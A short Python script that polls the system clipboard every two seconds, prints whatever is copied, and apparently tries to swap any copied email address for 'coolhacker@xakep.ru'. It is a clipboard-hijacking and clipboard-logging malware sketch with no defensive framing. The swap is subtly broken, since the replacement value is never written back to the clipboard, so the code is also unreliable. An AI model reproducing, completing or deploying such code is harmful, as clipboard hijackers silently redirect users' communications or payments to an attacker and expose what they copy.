import pyperclip
import time

old =''
while True:
    s = pyperclip.paste()
    if s != old:
        if '@' in s and s != 'coolhacker@xakep.ru':
            print(s)
            old = s
            s = 'coolhacker@xakep.ru'
        else:
            print(s)
            old = s
    time.sleep(2)
